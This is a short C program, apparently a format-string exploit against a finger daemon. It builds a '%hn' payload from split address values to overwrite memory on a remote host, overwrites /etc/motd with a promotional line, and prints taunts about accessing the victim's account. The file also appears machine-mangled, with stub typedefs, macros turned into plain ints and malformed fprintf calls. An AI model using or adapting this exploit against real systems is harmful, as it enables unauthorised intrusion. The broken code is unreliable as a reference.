
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int OVER ;
 int WITH ;
 int exit (int) ;
 int fclose (int *) ;
 int * fopen (char*,char*) ;
 int fprintf (char*,...) ;
 int printf (char*,...) ;
 int * stderr ;
 int strlen (char*) ;

main(int argc,char*argv[])
{
 int z0=0,ovrw=OVER;
 int z1=0,ovrw1=OVER+2;
 int slen=strlen("evil fingered from ")+9;
 int addr=WITH;
 int offset=20;
 int a1,a2;
 FILE *f;
 f=fopen("/etc/motd","w+");
 if(!f)
 {
  fprintf("You must be root to use this exploit.\n");
  exit(1);
 }
 a1=(addr&0x000ffff)-slen;
 a2=(0x10000+(addr>>16)-a1-slen)&0x0ffff;
 printf(":::A%s%s",&ovrw,&ovrw1);
 printf("%%%ux%%%d$hn%%%ux%%%d$hn\n"
        ,a1,offset,a2,offset+1);
 fprintf(stderr,"Visit http://mp3.com/cosv/ today!\n");
 fprintf(stderr,"And mebe visit your account on the other machine.\n");
 fprintf(stderr,"after you finger it.\n");
 fprintf(f,"Visit http://mp3.com/cosv/ today!\n");
 fclose(f);

}
